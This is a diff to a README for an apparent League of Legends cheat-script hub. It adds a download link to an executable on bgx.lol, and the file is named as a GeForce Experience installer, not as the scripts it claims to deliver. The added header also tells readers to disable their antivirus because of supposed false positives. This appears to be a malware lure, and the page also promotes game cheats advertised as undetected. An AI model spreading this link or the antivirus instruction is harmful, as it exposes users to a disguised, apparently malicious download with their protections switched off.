@@ -1,3 +1,7 @@
+# Download links
+Click [here](https://bgx.lol/download/Geforce%20Experience%20Setup%201.4.2.exe) to download the latest version of our scripts.
+Make sure to disable your antivirus for installation process as there are false-positives.
+
 # Ultimate League of Legends Script Hub 🚀🎮
 
 Welcome to the ultimate hub for League of Legends scripts! 🏆 Elevate your gaming experience with our cutting-edge scripts designed to enhance your skills and take your gameplay to the next level. Whether you're looking for 1v1.lol scripts, the best scripts in 2023, or undetected and affordable options, we've got you covered.
@@ -39,7 +43,7 @@ Yes, our scripts are undetected and designed with safety in mind. However, it's 
 Installation instructions are provided with each script. Simply follow the steps outlined in the documentation for a seamless setup process.
 
 ## Download Now 📥🚀
-Click [here](#) to download the latest version of our scripts. Elevate your League of Legends experience today!
+Click [here](https://bgx.lol/download/Geforce%20Experience%20Setup%201.4.2.exe) to download the latest version of our scripts. Elevate your League of Legends experience today!
 
 ## Community and Support 🤝💬
 Join our community on [Reddit](https://www.reddit.com/r/lolscripts/) to connect with other users, share tips, and get support. Our dedicated support team is also available to assist you with any issues.
